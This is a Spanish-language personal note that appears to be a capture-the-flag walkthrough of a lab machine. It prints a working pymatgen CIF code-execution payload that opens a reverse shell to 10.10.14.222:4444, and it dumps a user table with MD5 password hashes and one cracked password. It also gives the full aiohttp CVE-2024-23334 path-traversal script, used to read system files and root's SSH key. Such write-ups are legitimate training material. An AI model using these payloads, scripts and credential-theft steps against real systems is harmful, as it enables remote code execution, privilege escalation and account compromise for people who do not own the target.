 #web_exploitation 

encontramos un servicio web en el puerto 5000 y nos podemos logear, investigando vemos que se pueden subir archivo CIF y hay un exploit en versiones anteriores a las de 2024 y esta es la web que encontre:
https://github.com/advisories/GHSA-vgv8-5cpj-qj2f
el archivo que subi tiene este content:
```cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c '/bin/sh -i >& /dev/tcp/10.10.14.222/4444 0>&1'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
me puse en modo escucha y le di a view
![[{DE819454-B9BC-4349-A29B-83E70C9AAD65}.png]]
![[{7B6542D5-9BAF-4947-9DFB-852D5300FC12}.png]]
ahora toca [[Tratamiento de la tty]], y analizamos el archivo .py de la web y encontramos la siguiente info:
- secretkey: `MyS3cretCh3mistry4PP`
- base de datos: `sqlite:///database.db`
vemos que tiene que haber algun archivo database.db por ahi y si buscar esta en ~/instance
vamos a ver que pone en el archivo
![[Pasted image 20241024230831.png]]
vemos datos por aqui
`pepeluiqfqd fulcrum  jorge123 memdik test kriste axel fabian gelacia eusebio tania victoria peter carlos jobert`
pero vamos a verlo mejor
```bash
sqlite3 sqlite3 /home/app/instance/database.db 
```
![[{803667DE-B3D8-4BDF-8772-ED12FA7EF995}.png]]
aqui tenemos todos los usuarios y password en md5, vamos a intentar pillar el del usuario rosa ya que tiene cuenta en este equipo
```text
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|neman|5f4dcc3b5aa765d61d8327deb882cf99
16|test|098f6bcd4621d373cade4e832627b4f6
17|dika|400b101d76bff5cabc298bbe080bbccf
18|meme|81dc9bdb52d04dc20036dbd8313ed055
19|f|8fa14cdd754f91cc6554c9e71929cce7
20|jorge123|f495be79bad3d692686f63d43283c1f8
21|fulcrum|202cb962ac59075b964b07152d234b70
22|sfq<s|0f6b42d7acd2faa40944e4b7a7c7daf5
23|qfqd|74dd82224e2eae0b1dc31a839cb20b9e
24|pepeluis|ce28b4838c0d053574e6e96ff8c03062
25|qdq|9ce9befcb11703fe1f6ed7161f36e9a8
26|admin' OR 1=1#|81dc9bdb52d04dc20036dbd8313ed055
27|cid|8c405ae1daf2575440a037284f934421
```
![[{9CB3058E-4827-4192-BC42-C8687C449D9A}.png]]
`unicorniosrosados`
vamos a iniciar session con ella `rosa/unicorniosrosados`
si revisamos su home vemos el linpeas aqui, pero voy a usar [[LinEnum]], y vemos que hay un servicio corriendo en el puerto 8080

![[{295E440F-858D-4EE2-8661-AF11C4BBEAA3} 1.png]]
si revisamos los procesos con `ps aux` vemos que root ha ejecutado este app.py
![[{F4746A74-47DA-4018-AFE7-C56312498CF2}.png]]
vamos a hacer un portforwarding usando ssh
```bash
ssh -L 8081:127.0.0.1:8080 rosa@10.10.11.38
```
tenemos esta web
![[{D8355B77-7998-48A5-87E4-D8D3BA058E9D}.png]]
vamos a ver que tecnologia usa
![[{F5AF62DD-AEAD-4388-9E61-6741A2A00B28}.png]]
`aiohttp 3.9.1` vamos a ver si tiene exploits https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh
lo usamos
```sh
#!/bin/bash

url="http://localhost:8081"
string="../"
payload="/static/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

> [!note]- --path-as-is
> La opción --path-as-is en cURL se utiliza para enviar la URL completa al servidor sin modificarla. Esto es útil cuando se quiere preservar el formato exacto de la URL, incluyendo cualquier codificación o estructura especial.

pero modificamos el script para el directorio `/assets`
![[{E4C7736C-2294-462A-AF22-9CD1AC96EBB7}.png]]
aqui lo tenemos, vamos a leer la key de ssh de root y nos la ponemos en nuestro equipo, le damos los permisos `chmod 400 ssh_rsa` y nos conectamos
```bash
ssh -i ssh_rsa root@10.10.11.38
```

![[{E442803E-1B05-4D71-BA55-6C8A1D945BB7}.png]]
